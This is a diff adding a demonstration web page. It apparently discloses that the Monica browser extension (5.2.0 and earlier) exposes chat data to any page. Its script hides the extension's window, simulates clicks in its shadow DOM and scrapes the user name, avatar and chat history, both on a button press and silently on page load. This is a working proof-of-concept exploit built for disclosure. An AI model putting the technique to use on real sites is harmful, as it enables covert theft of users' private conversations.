@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Monica extension is leaking your data</title>
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <!-- <script src="https://unpkg.com/vue@3/dist/vue.global.prod.js"></script> -->
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body>
+    <div id="app">
+        <div class="flex items-center justify-center h-screen gap-6 p-6 bg-sky-950">
+            <div class="flex flex-col shadow rounded p-6 w-96 bg-white max-h-[90vh]">
+                <h1 class="text-3xl font-bold text-center">
+                    ⚠️ Monica Extension is Leaking your Data
+                </h1>
+                <p class="text-sm my-4 px-2">
+                    In Monica 5.2.0 and earlier, your chat data could be accessed silently in the background on
+                    <span class="text-rose-600 font-bold">every webpage</span>.
+                </p>
+                <div class="my-4">
+                    <button v-if="!monica.installed" disabled class="w-full p-3 bg-green-500 rounded text-lg">
+                        Installation not detected
+                    </button>
+                    <button v-else-if="!monica.loading" :disabled="monica.loading"
+                        class="w-full p-3 bg-black rounded text-lg text-white font-bold" @click="check">
+                        Check
+                    </button>
+                    <div v-else class="my-4 flex justify-center">
+                        <div class="animate-spin size-12 rounded-full border-[5px] border-r-transparent"></div>
+                    </div>
+                </div>
+                <div class="my-4 overflow-auto">
+                    <div v-for="item in monica.leaks" class="my-2">
+                        <div class="text-sm flex gap-2 items-center">
+                            <div class="size-2 rounded-full bg-red-400"></div>
+                            <span>{{ item.label }}</span>
+                        </div>
+                        <div class="text-base ms-4">
+                            <img v-if="/^https?:\/\/.+\.(jpg|png)$/.test(item.value)" :src="item.value" class="size-8">
+                            <span v-else>{{ item.value }}</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const { createApp, ref, reactive, onMounted, onUnmounted } = Vue
+        createApp({
+            setup() {
+                const monica = reactive({
+                    installed: false,
+                    loading: false,
+                    leaks: [
+                        // {
+                        //     label: "User Name",
+                        //     value: "Your Name"
+                        // },
+                    ],
+                })
+
+                const learn = ref(false)
+
+                let timer
+
+                onMounted(() => {
+                    let count = 0
+                    timer = setTimeout(function a() {
+                        count++
+                        const monicaRoot = document.querySelector('#monica-content-root')
+                        if (monicaRoot) {
+                            monica.installed = true
+                        } else if (count < 10) {
+                            timer = setTimeout(a, 500)
+                        }
+                    }, 500)
+                })
+
+                onUnmounted(() => {
+                    clearTimeout(timer)
+                })
+
+                function check() {
+                    monica.loading = true
+                    monica.leaks = []
+                    checkMonica((label, value) => {
+                        monica.leaks.push({ label, value })
+                    }).finally(() => {
+                        monica.loading = false
+                    })
+                }
+
+                return {
+                    monica,
+                    learn,
+                    check,
+                }
+            }
+        }).mount('#app')
+
+
+        async function checkMonica(report) {
+            const monicaRoot = document.querySelector('#monica-content-root')
+            const sr = monicaRoot?.shadowRoot
+
+            if (!sr) {
+                console.log('monica root: ', monicaRoot, sr)
+                return
+            }
+
+            const sheet = new CSSStyleSheet()
+            sheet.insertRule(`html { width: 100% !important; }`)
+
+            const innerSheet = new CSSStyleSheet()
+            innerSheet.insertRule(`#monica-main-window-root { visibility: hidden !important; }`)
+            innerSheet.insertRule(`[class^="sidebar-entry-btn"]{ right: 0 !important; }`)
+
+            sr.adoptedStyleSheets = [...sr.adoptedStyleSheets, innerSheet]
+            document.adoptedStyleSheets = [...document.adoptedStyleSheets, sheet]
+
+
+            try {
+                const floatBtn = sr.querySelector('[class^="float-btn-box"] [class^="float-btn"]')
+                floatBtn?.dispatchEvent(new Event('mousedown', { bubbles: true, cancelable: true }))
+                floatBtn?.dispatchEvent(new Event('mouseup', { bubbles: true, cancelable: true }))
+                await new Promise((r) => setTimeout(r, 200))
+
+                const username = sr.querySelector('[class^="chat-header-title-"] div span span')
+                username && report("User Name", username.textContent)
+
+                const avatar = sr.querySelector('[class^="user-avatar-"] img')
+                avatar && report("Avatar", avatar.src)
+
+                const historyBtn = sr.querySelector('[class^="chat-toolbar-right"] > [class^="chat-toolbar"]')
+                historyBtn?.click()
+
+                await new Promise((r) => setTimeout(r, 200))
+
+                const convs = sr.querySelectorAll('[class^="conv-list"] [class^="conv-item-wrapper"]')
+
+                convs?.forEach((n) => report("Chat", n.textContent))
+
+                floatBtn?.dispatchEvent(new Event('mousedown', { bubbles: true, cancelable: true }))
+                floatBtn?.dispatchEvent(new Event('mouseup', { bubbles: true, cancelable: true }))
+            } catch (err) {
+                console.error(err)
+            } finally {
+                innerSheet.disabled = true
+                sheet.disabled = true
+            }
+        }
+
+        checkMonica(console.log)
+    </script>
+</body>
+
+</html>
